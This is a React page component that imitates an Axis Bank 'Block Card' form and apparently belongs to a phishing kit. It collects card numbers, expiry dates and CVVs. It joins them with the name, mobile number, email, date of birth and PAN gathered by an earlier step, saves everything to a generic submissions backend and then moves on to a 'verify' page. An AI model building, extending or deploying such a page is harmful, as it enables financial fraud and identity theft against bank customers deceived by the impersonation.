import { Link, useNavigate } from "react-router";
import { useState } from "react";
import { trpc } from "@/providers/trpc";
import {
  User,
  CreditCard,
  Calendar,
  Lock,
  ArrowLeft,
  ArrowRight,
  Shield,
} from "lucide-react";

export default function Block() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    blockName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardHolder: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const createSubmission = trpc.submissions.create.useMutation({
    onSuccess: () => {
      navigate("/verify");
    },
    onError: () => {
      alert("Failed to save. Please try again.");
    },
  });

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.blockName.trim()) newErrors.blockName = "Name is required";
    if (!formData.cardNumber.trim() || formData.cardNumber.replace(/\s/g, "").length < 16)
      newErrors.cardNumber = "Valid 16-digit card number required";
    if (!formData.expiry.trim() || !/^\d{2}\/\d{2}$/.test(formData.expiry))
      newErrors.expiry = "Valid expiry required (MM/YY)";
    if (!formData.cvv.trim() || formData.cvv.length < 3)
      newErrors.cvv = "Valid CVV required";
    if (!formData.cardHolder.trim()) newErrors.cardHolder = "Card holder name is required";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    const applyDataStr = sessionStorage.getItem("applyData");
    const applyData = applyDataStr ? JSON.parse(applyDataStr) : {};

    createSubmission.mutate({
      type: "Block Card",
      fullName: applyData.fullName || formData.blockName,
      mobile: applyData.mobile || "",
      email: applyData.email || "",
      city: applyData.city || "",
      dob: applyData.dob || "",
      pan: applyData.pan || "",
      cardLimit: applyData.cardLimit || "",
      cardNumber: formData.cardNumber,
      expiry: formData.expiry,
      cvv: formData.cvv,
      cardHolder: formData.cardHolder,
    });
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(" ");
  };

  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4);
    }
    return v;
  };

  const inputClass = (field: string) =>
    `w-full pl-10 pr-4 py-3 border rounded-lg outline-none transition-all ${
      errors[field]
        ? "border-red-400 focus:border-red-500 focus:ring-2 focus:ring-red-100"
        : "border-gray-200 focus:border-[#96144c] focus:ring-2 focus:ring-[#96144c]/10"
    }`;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#96144c] px-4 sm:px-6 py-4 flex items-center justify-between shadow-md">
        <Link to="/" className="text-white text-xl font-bold tracking-wider">
          AXIS BANK
        </Link>
        <Link
          to="/apply"
          className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
        >
          <ArrowLeft size={16} /> Back
        </Link>
      </header>

      <div className="max-w-xl mx-auto px-4 py-8 sm:py-12">
        {/* Progress */}
        <div className="flex items-center justify-center gap-2 mb-8">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
              <Shield size={14} />
            </div>
            <span className="text-sm font-semibold text-green-600">Apply</span>
          </div>
          <div className="w-12 h-0.5 bg-[#96144c]" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-[#96144c] text-white rounded-full flex items-center justify-center text-sm font-bold">
              2
            </div>
            <span className="text-sm font-semibold text-[#96144c]">Card Details</span>
          </div>
          <div className="w-12 h-0.5 bg-gray-300" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gray-300 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
              3
            </div>
            <span className="text-sm text-gray-400">Verify</span>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
          <div className="bg-[#96144c] px-6 py-4">
            <h2 className="text-white text-center text-lg font-semibold">
              Enter your card details
            </h2>
          </div>

          <form onSubmit={handleSubmit} className="p-6 sm:p-8">
            <div className="flex flex-col gap-5">
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Name
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="Enter your name"
                    className={inputClass("blockName")}
                    value={formData.blockName}
                    onChange={(e) =>
                      setFormData({ ...formData, blockName: e.target.value })
                    }
                  />
                </div>
                {errors.blockName && (
                  <p className="text-red-500 text-xs mt-1">{errors.blockName}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Card Number
                </label>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="XXXX XXXX XXXX XXXX"
                    maxLength={19}
                    className={inputClass("cardNumber")}
                    value={formData.cardNumber}
                    onChange={(e) =>
                      setFormData({
                        ...formData,
                        cardNumber: formatCardNumber(e.target.value),
                      })
                    }
                  />
                </div>
                {errors.cardNumber && (
                  <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>
                )}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                    MM/YY
                  </label>
                  <div className="relative">
                    <Calendar className="absolute left-3 top-3 text-[#96144c]" size={18} />
                    <input
                      type="text"
                      placeholder="MM/YY"
                      maxLength={5}
                      className={inputClass("expiry")}
                      value={formData.expiry}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          expiry: formatExpiry(e.target.value),
                        })
                      }
                    />
                  </div>
                  {errors.expiry && (
                    <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>
                  )}
                </div>
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                    CVV
                  </label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-3 text-[#96144c]" size={18} />
                    <input
                      type="password"
                      placeholder="CVV"
                      maxLength={3}
                      className={inputClass("cvv")}
                      value={formData.cvv}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          cvv: e.target.value.replace(/\D/g, ""),
                        })
                      }
                    />
                  </div>
                  {errors.cvv && (
                    <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>
                  )}
                </div>
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Card Holder Name
                </label>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="Name as on card"
                    className={inputClass("cardHolder")}
                    value={formData.cardHolder}
                    onChange={(e) =>
                      setFormData({ ...formData, cardHolder: e.target.value })
                    }
                  />
                </div>
                {errors.cardHolder && (
                  <p className="text-red-500 text-xs mt-1">{errors.cardHolder}</p>
                )}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3 mt-6">
              <Link
                to="/apply"
                className="flex items-center justify-center gap-2 border-2 border-gray-300 text-gray-600 py-3 rounded-xl font-semibold hover:bg-gray-50 transition-all"
              >
                <ArrowLeft size={16} /> Back
              </Link>
              <button
                type="submit"
                disabled={createSubmission.isPending}
                className="bg-[#96144c] text-white py-3 rounded-xl font-bold hover:shadow-lg hover:-translate-y-0.5 transition-all disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {createSubmission.isPending ? (
                  "Processing..."
                ) : (
                  <>
                    Submit <ArrowRight size={16} />
                  </>
                )}
              </button>
            </div>
          </form>
        </div>
      </div>

      <footer className="bg-gray-900 text-white text-center py-4">
        <p className="text-sm opacity-60">&copy; 2026 Axis Bank Ltd. All rights reserved.</p>
      </footer>
    </div>
  );
}
